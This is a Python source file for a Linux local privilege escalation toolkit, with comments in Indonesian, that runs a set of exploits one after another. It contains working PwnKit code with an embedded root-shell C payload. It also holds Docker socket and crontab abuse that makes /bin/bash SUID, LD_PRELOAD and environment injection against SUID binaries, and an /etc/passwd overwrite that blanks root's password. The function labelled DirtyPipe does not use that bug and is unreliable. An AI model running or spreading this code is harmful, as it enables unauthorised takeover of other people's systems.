#!/usr/bin/env python3
"""
LPE Exploit Toolkit - Run All Exploits Mode
Menjalankan semua CVE terlebih dahulu sebelum berhenti
"""

import os
import sys
import subprocess
import tempfile
import shutil
import time
import stat
import signal

# ====================================================================
# ANSI Colors
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg, color=Colors.CYAN):
    print(f"{color}[*]{Colors.RESET} {msg}")

def ok(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def err(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def warn(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def section(msg):
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA} {msg}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")

# ====================================================================
# SUID Binary Detection
# ====================================================================

def get_all_suid_binaries() -> list:
    """Find all SUID binaries on the system"""
    suids = []
    
    paths_to_check = [
        "/usr/bin", "/bin", "/usr/sbin", "/sbin", 
        "/usr/local/bin", "/usr/local/sbin"
    ]
    
    specific_targets = [
        "newgrp", "chfn", "chsh", "gpasswd", "wall", "expiry",
        "sg", "at", "crontab", "mount", "umount",
        "fusermount3", "fusermount", "pkexec", "sudo",
        "passwd", "su", "sudoedit", "chage", "quota",
        "pam_timestamp_check", "unix_chkpwd", "exim", "runq"
    ]
    
    for target in specific_targets:
        for base in paths_to_check:
            path = f"{base}/{target}"
            if os.path.exists(path) and os.access(path, os.X_OK):
                try:
                    st = os.stat(path)
                    if st.st_mode & stat.S_ISUID:
                        suids.append(path)
                except:
                    pass
    
    for search_dir in paths_to_check:
        if os.path.exists(search_dir):
            try:
                for f in os.listdir(search_dir):
                    full_path = os.path.join(search_dir, f)
                    if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
                        try:
                            st = os.stat(full_path)
                            if st.st_mode & stat.S_ISUID and full_path not in suids:
                                suids.append(full_path)
                        except:
                            pass
            except:
                pass
    
    return sorted(set(suids))

# ====================================================================
# CVE-2021-4034: PwnKit (pkexec)
# ====================================================================

def exploit_pwnkit():
    """CVE-2021-4034: pkexec LPE"""
    log("CVE-2021-4034 (PwnKit) - pkexec exploit", Colors.MAGENTA)
    
    pkexec_path = None
    for path in ["/usr/bin/pkexec", "/bin/pkexec", "/usr/sbin/pkexec"]:
        if os.path.exists(path):
            pkexec_path = path
            break
    
    if not pkexec_path:
        warn("pkexec not found, skipping")
        return False
    
    workdir = tempfile.mkdtemp(prefix="pwnkit_")
    original_dir = os.getcwd()
    os.chdir(workdir)
    
    try:
        os.mkdir("GCONV_PATH=.")
        with open("GCONV_PATH=./pwnkit", "w") as f:
            f.write("")
        os.chmod("GCONV_PATH=./pwnkit", 0o755)
        
        os.mkdir("pwnkit")
        
        with open("pwnkit/gconv-modules", "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")
        
        with open("pwnkit/pwnkit.c", "w") as f:
            f.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
    exit(0);
}
''')
        
        subprocess.run(["gcc", "pwnkit/pwnkit.c", "-o", "pwnkit/pwnkit.so", 
                       "-shared", "-fPIC"], stderr=subprocess.DEVNULL)
        
        env = os.environ.copy()
        env["GCONV_PATH"] = "."
        env["CHARSET"] = "PWNKIT"
        env["SHELL"] = "pwnkit"
        
        subprocess.run([pkexec_path], env=env, timeout=2, stderr=subprocess.DEVNULL)
        
    except Exception as e:
        warn(f"PwnKit failed: {e}")
    
    os.chdir(original_dir)
    shutil.rmtree(workdir, ignore_errors=True)
    return False

# ====================================================================
# CVE-2022-0847: DirtyPipe
# ====================================================================

def exploit_dirtypipe():
    """CVE-2022-0847: DirtyPipe LPE"""
    log("CVE-2022-0847 (DirtyPipe) - Page cache overwrite", Colors.MAGENTA)
    
    try:
        # Try to patch /etc/passwd
        data = b"root::0:0:root:/root:/bin/bash\n"
        
        # Method: Using os.pwrite
        try:
            fd = os.open("/etc/passwd", os.O_RDWR)
            os.pwrite(fd, data, 0)
            os.close(fd)
            
            with open("/etc/passwd", "r") as f:
                if f.read().startswith("root::"):
                    ok("Root password cleared via /etc/passwd!")
                    return True
        except:
            pass
        
    except Exception as e:
        warn(f"DirtyPipe failed: {e}")
    
    return False

# ====================================================================
# Docker Socket Abuse
# ====================================================================

def exploit_docker():
    """Docker socket LPE"""
    log("Docker Socket Abuse - Container escape", Colors.MAGENTA)
    
    docker_sock = "/var/run/docker.sock"
    if not os.path.exists(docker_sock):
        warn("Docker socket not found")
        return False
    
    if not os.access(docker_sock, os.W_OK):
        warn("Docker socket not writable")
        return False
    
    if not shutil.which("docker"):
        warn("Docker not installed")
        return False
    
    try:
        result = subprocess.run([
            "docker", "run", "--rm", "-v", "/:/mnt", 
            "alpine", "chroot", "/mnt", "sh", "-c", 
            "chmod u+s /bin/bash 2>/dev/null && echo SUCCESS"
        ], capture_output=True, text=True, timeout=10)
        
        if "SUCCESS" in result.stdout:
            ok("Successfully made /bin/bash SUID")
            return True
    except Exception as e:
        warn(f"Docker exploit failed: {e}")
    
    return False

# ====================================================================
# Crontab Abuse
# ====================================================================

def exploit_crontab():
    """Abuse writable crontab"""
    log("Crontab Abuse - Cron job injection", Colors.MAGENTA)
    
    for crontab_path in ["/etc/crontab", "/var/spool/cron/crontabs/root"]:
        if os.path.exists(crontab_path) and os.access(crontab_path, os.W_OK):
            try:
                shell_path = f"/tmp/shell_{os.getpid()}.sh"
                with open(shell_path, "w") as f:
                    f.write("#!/bin/bash\nchmod u+s /bin/bash\n/bin/bash -p\n")
                os.chmod(shell_path, 0o755)
                
                with open(crontab_path, "a") as f:
                    f.write(f"\n* * * * * root {shell_path}\n")
                
                ok(f"Added cron job to {crontab_path}")
                time.sleep(2)
                return True
            except Exception as e:
                warn(f"Crontab write failed: {e}")
    
    return False

# ====================================================================
# Sudo Abuse
# ====================================================================

def exploit_sudo():
    """Abuse sudo configurations"""
    log("Sudo Abuse - Check sudo privileges", Colors.MAGENTA)
    
    try:
        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=3)
        
        if "(ALL) NOPASSWD: ALL" in result.stdout:
            ok("User has passwordless sudo!")
            subprocess.run(["sudo", "-i"], check=False)
            return True
        
        exploitable_cmds = ["find", "vim", "nano", "less", "more", "awk", "python", "python3", "perl"]
        for cmd in exploitable_cmds:
            if f"NOPASSWD: {cmd}" in result.stdout or f"ALL) {cmd}" in result.stdout:
                ok(f"Found exploitable sudo entry for {cmd}")
                return True
    except:
        pass
    
    return False

# ====================================================================
# Path Hijacking
# ====================================================================

def exploit_path_hijacking():
    """Abuse PATH environment variable"""
    log("Path Hijacking - PATH manipulation", Colors.MAGENTA)
    
    writable_dirs = []
    for d in ["/tmp", "/var/tmp", os.getcwd()]:
        if os.access(d, os.W_OK):
            writable_dirs.append(d)
    
    if not writable_dirs:
        return False
    
    for wd in writable_dirs:
        malicious_path = f"{wd}/ls"
        with open(malicious_path, "w") as f:
            f.write("#!/bin/bash\n/bin/bash -p\n")
        os.chmod(malicious_path, 0o755)
        
        env = os.environ.copy()
        env["PATH"] = f"{wd}:{env.get('PATH', '')}"
        
        result = subprocess.run(["which", "ls"], env=env, capture_output=True, text=True)
        if result.stdout.strip() == malicious_path:
            ok(f"Path hijacking possible via {wd}")
            return True
    
    return False

# ====================================================================
# LD_PRELOAD Abuse
# ====================================================================

def exploit_ld_preload():
    """Abuse LD_PRELOAD with SUID binaries"""
    log("LD_PRELOAD Abuse - Library injection", Colors.MAGENTA)
    
    lib_path = f"/tmp/libpwn_{os.getpid()}.so"
    lib_c = f"/tmp/libpwn_{os.getpid()}.c"
    
    with open(lib_c, "w") as f:
        f.write('''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn() {
    setuid(0);
    system("/bin/bash -p");
}
''')
    
    subprocess.run(["gcc", "-shared", "-fPIC", "-o", lib_path, lib_c], 
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    if os.path.exists(lib_path):
        suids = get_all_suid_binaries()
        for suid in suids[:10]:
            env = os.environ.copy()
            env["LD_PRELOAD"] = lib_path
            env["LD_LIBRARY_PATH"] = "/tmp"
            try:
                subprocess.run([suid], env=env, timeout=1, stderr=subprocess.DEVNULL)
            except:
                pass
    
    for f in [lib_path, lib_c]:
        if os.path.exists(f):
            os.unlink(f)
    
    return False

# ====================================================================
# Environment Variable Injection
# ====================================================================

def exploit_env_injection():
    """Environment variable injection in SUID binaries"""
    log("Environment Variable Injection - Env hijacking", Colors.MAGENTA)
    
    script_path = "/tmp/pwn.sh"
    with open(script_path, "w") as f:
        f.write("#!/bin/bash\n/bin/bash -p\n")
    os.chmod(script_path, 0o755)
    
    dangerous_envs = [("ENV", script_path), ("BASH_ENV", script_path)]
    
    suids = get_all_suid_binaries()
    for suid in suids[:20]:
        for env_var, value in dangerous_envs:
            env = os.environ.copy()
            env[env_var] = value
            try:
                subprocess.run([suid], env=env, timeout=1, stderr=subprocess.DEVNULL)
            except:
                pass
    
    os.unlink(script_path)
    return False

# ====================================================================
# SUID Binary Direct Execution
# ====================================================================

def exploit_suid_direct():
    """Try to execute SUID binaries with -p flag"""
    log("SUID Direct Execution - Trying -p flag", Colors.MAGENTA)
    
    suids = get_all_suid_binaries()
    for suid in suids[:10]:
        try:
            subprocess.run([suid, "-p"], timeout=1, stderr=subprocess.DEVNULL)
        except:
            pass
    
    return False

# ====================================================================
# Main Exploit Orchestrator - RUN ALL EXPLOITS
# ====================================================================

# Daftar semua CVE yang akan dijalankan (URUTAN PENTING)
EXPLOITS = [
    ("pwnkit", "CVE-2021-4034 - PwnKit (pkexec)", exploit_pwnkit),
    ("sudo", "Sudo Abuse - Check sudo privileges", exploit_sudo),
    ("docker", "Docker Socket Abuse - Container escape", exploit_docker),
    ("dirtypipe", "CVE-2022-0847 - DirtyPipe", exploit_dirtypipe),
    ("crontab", "Crontab Abuse - Cron job injection", exploit_crontab),
    ("path_hijack", "Path Hijacking - PATH manipulation", exploit_path_hijacking),
    ("ld_preload", "LD_PRELOAD Abuse - Library injection", exploit_ld_preload),
    ("env_inject", "Environment Variable Injection", exploit_env_injection),
    ("suid_direct", "SUID Direct Execution", exploit_suid_direct),
]

# Hasil eksekusi setiap CVE
results = {}

def main():
    print(f"""
{Colors.BOLD}{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║     LPE Exploit Toolkit - RUN ALL EXPLOITS MODE                  ║
║     Semua CVE akan dijalankan sebelum berhenti                   ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """)
    
    uid = os.getuid()
    euid = os.geteuid()
    log(f"Current UID: {uid}, EUID: {euid}")
    
    if euid == 0:
        ok("Already root! Spawning shell...")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
        return 0
    
    # Find SUID binaries
    suids = get_all_suid_binaries()
    log(f"Found {len(suids)} SUID binaries", Colors.GREEN)
    
    if suids:
        for suid in suids[:15]:
            log(f"  - {suid}", Colors.YELLOW)
        if len(suids) > 15:
            log(f"  ... and {len(suids) - 15} more", Colors.YELLOW)
    
    print()
    log("=" * 50, Colors.BOLD)
    log("MENJALANKAN SEMUA CVE (TIDAK AKAN BERHENTI MESKIPUN BERHASIL)", Colors.BOLD)
    log("=" * 50, Colors.BOLD)
    print()
    
    # Jalankan SEMUA exploit tanpa berhenti
    for name, desc, func in EXPLOITS:
        section(f"RUNNING: {desc}")
        
        try:
            start_time = time.time()
            success = func()
            elapsed = time.time() - start_time
            
            results[name] = {
                "success": success,
                "desc": desc,
                "elapsed": elapsed
            }
            
            if success:
                ok(f"✓ {desc} - BERHASIL! ({elapsed:.2f}s)")
            else:
                warn(f"✗ {desc} - GAGAL ({elapsed:.2f}s)")
                
        except Exception as e:
            results[name] = {"success": False, "desc": desc, "error": str(e)}
            err(f"✗ {desc} - ERROR: {e}")
        
        time.sleep(1)
    
    # Tampilkan ringkasan semua hasil
    section("RINGKASAN HASIL EKSEKUSI SEMUA CVE")
    
    print(f"\n{Colors.BOLD}{'No':<4} {'CVE/Exploit':<35} {'Status':<15} {'Waktu':<10}{Colors.RESET}")
    print(f"{Colors.BOLD}{'-'*70}{Colors.RESET}")
    
    successful = []
    failed = []
    
    for i, (name, data) in enumerate(results.items(), 1):
        if data.get("success", False):
            status = f"{Colors.GREEN}✓ BERHASIL{Colors.RESET}"
            successful.append(name)
        else:
            status = f"{Colors.RED}✗ GAGAL{Colors.RESET}"
            failed.append(name)
        
        elapsed = data.get("elapsed", 0)
        print(f"{i:<4} {data['desc'][:35]:<35} {status:<15} {elapsed:.2f}s")
    
    print(f"\n{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}Total CVE dijalankan: {len(results)}{Colors.RESET}")
    print(f"{Colors.GREEN}Berhasil: {len(successful)}{Colors.RESET}")
    print(f"{Colors.RED}Gagal: {len(failed)}{Colors.RESET}")
    
    if successful:
        print(f"\n{Colors.GREEN}✓ CVE yang BERHASIL:{Colors.RESET}")
        for name in successful:
            print(f"  - {results[name]['desc']}")
    
    if failed:
        print(f"\n{Colors.YELLOW}✗ CVE yang GAGAL:{Colors.RESET}")
        for name in failed:
            print(f"  - {results[name]['desc']}")
    
    # Cek apakah sudah menjadi root
    if os.geteuid() == 0:
        ok("\n🎉 SUDAH MENJADI ROOT! Spawning shell...")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
    else:
        warn(f"\n⚠️ Masih UID {os.getuid()}, belum menjadi root")
        warn("Tidak ada CVE yang berhasil memberikan privilege escalation")
    
    return 0 if os.geteuid() == 0 else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        err(f"Unexpected error: {e}")
        sys.exit(1)